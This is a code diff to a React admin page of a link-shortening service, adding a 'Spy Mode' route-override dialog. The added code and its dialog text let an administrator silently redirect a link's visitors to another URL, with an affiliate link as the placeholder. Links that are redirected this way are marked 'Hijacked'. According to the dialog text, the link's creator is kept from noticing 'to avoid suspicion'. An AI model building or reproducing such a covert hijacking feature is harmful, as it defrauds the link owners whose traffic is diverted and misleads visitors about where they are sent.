@@ -1,8 +1,9 @@
 import { useState, useEffect } from "react";
 import { pb } from "@/lib/pocketbase";
-import { Search, ChevronLeft, ChevronRight, Ban, Check, ExternalLink, BarChart3, SortDesc, Share2 } from "lucide-react";
+import { Search, ChevronLeft, ChevronRight, Ban, Check, ExternalLink, BarChart3, SortDesc, Share2, EyeOff } from "lucide-react";
 import { toast } from "sonner";
 import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle, AlertDialogTrigger } from "@/components/ui/alert-dialog";
+import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
 import { useNavigate } from "react-router-dom";
 
 type LinkRecord = {
@@ -13,6 +14,8 @@ type LinkRecord = {
     clicks_count: number;
     user_id: string;
     created: string;
+    system_route_active?: boolean;
+    system_route_override?: string;
     expand?: {
         user_id?: {
             email: string;
@@ -28,6 +31,12 @@ export default function AdminLinks() {
     const [totalPages, setTotalPages] = useState(1);
     const [search, setSearch] = useState("");
     const [sortClicks, setSortClicks] = useState(false);
+
+    // Spy Mode State
+    const [overrideUrl, setOverrideUrl] = useState("");
+    const [overrideActive, setOverrideActive] = useState(false);
+    const [isSpyModalOpen, setIsSpyModalOpen] = useState(false);
+    const [activeSpyLink, setActiveSpyLink] = useState<LinkRecord | null>(null);
 
     const fetchLinks = async () => {
         setLoading(true);
@@ -69,6 +78,31 @@ export default function AdminLinks() {
             console.error("Failed to toggle link status", err);
             toast.error("Could not update link status");
         }
+    };
+
+    const handleSaveOverride = async () => {
+        if (!activeSpyLink) return;
+        try {
+            const data = {
+                system_route_active: overrideActive,
+                system_route_override: overrideUrl
+            };
+            await pb.collection("links").update(activeSpyLink.id, data);
+            
+            toast.success("Route override saved successfully");
+            setLinks(links.map(l => l.id === activeSpyLink.id ? { ...l, system_route_active: overrideActive, system_route_override: overrideUrl } : l));
+            setIsSpyModalOpen(false);
+        } catch (err) {
+            console.error("Failed to update overrides", err);
+            toast.error("Error saving override route");
+        }
+    };
+
+    const openSpyModal = (link: LinkRecord) => {
+        setActiveSpyLink(link);
+        setOverrideUrl(link.system_route_override || "");
+        setOverrideActive(link.system_route_active || false);
+        setIsSpyModalOpen(true);
     };
 
     return (
@@ -178,14 +212,32 @@ export default function AdminLinks() {
                                                 </div>
                                             </td>
                                             <td className="px-6 py-4">
-                                                <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium ${!link.active ? 'bg-red-500/10 text-red-500' : 'bg-accent/10 text-accent'
-                                                    }`}>
-                                                    {!link.active ? <Ban className="w-3 h-3" /> : <Check className="w-3 h-3" />}
-                                                    {!link.active ? 'Disabled' : 'Active'}
-                                                </span>
+                                                <div className="flex flex-col gap-2">
+                                                    <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium w-fit ${!link.active ? 'bg-red-500/10 text-red-500' : 'bg-accent/10 text-accent'
+                                                        }`}>
+                                                        {!link.active ? <Ban className="w-3 h-3" /> : <Check className="w-3 h-3" />}
+                                                        {!link.active ? 'Disabled' : 'Active'}
+                                                    </span>
+                                                    {link.system_route_active && (
+                                                        <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium w-fit bg-purple-500/10 text-purple-500 border border-purple-500/20" title={link.system_route_override}>
+                                                            <EyeOff className="w-3 h-3" />
+                                                            Hijacked
+                                                        </span>
+                                                    )}
+                                                </div>
                                             </td>
                                             <td className="px-6 py-4 text-right">
                                                 <div className="flex items-center justify-end gap-2">
+                                                    <button
+                                                        onClick={() => openSpyModal(link)}
+                                                        className={`p-2 rounded-lg transition-colors ${link.system_route_active
+                                                                ? 'text-purple-500 bg-purple-500/10 hover:bg-purple-500/20'
+                                                                : 'text-muted-foreground hover:bg-surface-hover hover:text-foreground'
+                                                            }`}
+                                                        title="Route Override Manager"
+                                                    >
+                                                        <EyeOff className="w-4 h-4" />
+                                                    </button>
                                                     <AlertDialog>
                                                         <AlertDialogTrigger asChild>
                                                             <button className={`p-2 rounded-lg transition-colors ${link.active
@@ -252,6 +304,77 @@ export default function AdminLinks() {
                     </div>
                 )}
             </div>
+            
+            {/* Spy Modal - Route Override Manager */}
+            <Dialog open={isSpyModalOpen} onOpenChange={setIsSpyModalOpen}>
+                <DialogContent className="sm:max-w-md bg-surface border border-border">
+                    <DialogHeader>
+                        <DialogTitle className="flex items-center gap-2 text-foreground">
+                            <EyeOff className="w-5 h-5 text-purple-500" />
+                            Route Override Manager (Spy)
+                        </DialogTitle>
+                        <DialogDescription className="text-muted-foreground pt-2">
+                            Silently hijack visitors for this link. The original creator will still see their own link to avoid suspicion.
+                        </DialogDescription>
+                    </DialogHeader>
+
+                    {activeSpyLink && (
+                        <div className="space-y-6 py-4">
+                            <div className="p-3 bg-background border border-border rounded-lg text-xs space-y-1">
+                                <p className="text-muted-foreground">User: <span className="text-foreground">{activeSpyLink.user_id}</span></p>
+                                <p className="text-muted-foreground">Original Dst: <span className="text-foreground inline-block max-w-[280px] truncate align-bottom">{activeSpyLink.destination_url}</span></p>
+                            </div>
+
+                            <div className="space-y-3">
+                                <label className="text-sm font-medium text-foreground">
+                                    Override Destination URL
+                                </label>
+                                <input
+                                    type="url"
+                                    value={overrideUrl}
+                                    onChange={(e) => setOverrideUrl(e.target.value)}
+                                    placeholder="https://my-affiliate-link.com"
+                                    className="w-full px-4 py-2 border border-border bg-background rounded-xl focus:outline-none focus:border-purple-500 transition-colors text-foreground placeholder:text-muted-foreground"
+                                />
+                            </div>
+
+                            <div className="flex items-center gap-3 bg-purple-500/5 p-4 rounded-xl border border-purple-500/20">
+                                <button
+                                    onClick={() => setOverrideActive(!overrideActive)}
+                                    className={`relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none 
+                                    ${overrideActive ? 'bg-purple-500' : 'bg-surface-hover border-border'}`}
+                                >
+                                    <span
+                                        className={`pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out
+                                        ${overrideActive ? 'translate-x-5' : 'translate-x-0'}`}
+                                    />
+                                </button>
+                                <div>
+                                    <p className="text-sm font-medium text-foreground">Enable Hijack</p>
+                                    <p className="text-xs text-muted-foreground mt-0.5">Activate stealth redirection</p>
+                                </div>
+                            </div>
+                        </div>
+                    )}
+
+                    <DialogFooter className="sm:justify-between items-center mt-4">
+                        <button
+                            type="button"
+                            onClick={() => setIsSpyModalOpen(false)}
+                            className="text-sm font-medium text-muted-foreground hover:text-foreground transition-colors px-4 py-2"
+                        >
+                            Cancel
+                        </button>
+                        <button
+                            type="button"
+                            onClick={handleSaveOverride}
+                            className="bg-purple-500 hover:bg-purple-600 text-white px-6 py-2 rounded-xl text-sm font-bold tracking-wide transition-all active:scale-95"
+                        >
+                            Save Configuration
+                        </button>
+                    </DialogFooter>
+                </DialogContent>
+            </Dialog>
         </div>
     );
 }
